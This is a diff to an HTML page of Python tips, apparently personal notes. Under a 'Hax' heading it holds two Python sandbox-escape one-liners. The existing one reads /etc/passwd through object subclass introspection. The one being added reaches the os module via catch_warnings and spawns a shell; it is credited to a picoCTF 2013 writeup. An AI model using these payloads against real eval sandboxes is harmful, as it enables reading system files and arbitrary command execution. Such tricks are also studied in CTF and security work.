@@ -99,6 +99,9 @@ time.sleep(0.5) # 0.5 seconds</pre>
 <h3>Hax</h3>
 <pre>[t for t in (1).__class__.__bases__[-1].__subclasses__() if t.__name__ == 'file'][0]('/etc/passwd').read()</pre>
 <p>(from <a href="http://eev.ee/blog/2012/03/24/on-principle/"><cite>On principle</cite> (eevee)</a>)</p>
+<p>Want a shell instead?</p>
+<pre>[x for x in().__class__.__bases__[0].__subclasses__() if x.__name__ == "catch_warnings"][0].__init__.func_globals["linecache"].__dict__["os"].execlp("sh","sh")</pre>
+<p>(from <a href="http://jonathanzong.com/picoctf/2013/05/07/python-eval-5-140">Jonathan Zong's picoCTF 2013 writeup</a>)</p>
 <h3>pygmentize</h3>
 <p>has complicated command line flags:</p>
 <pre>pygmentize -f html -l python -O full,style=tango -o out.html src.py</pre>
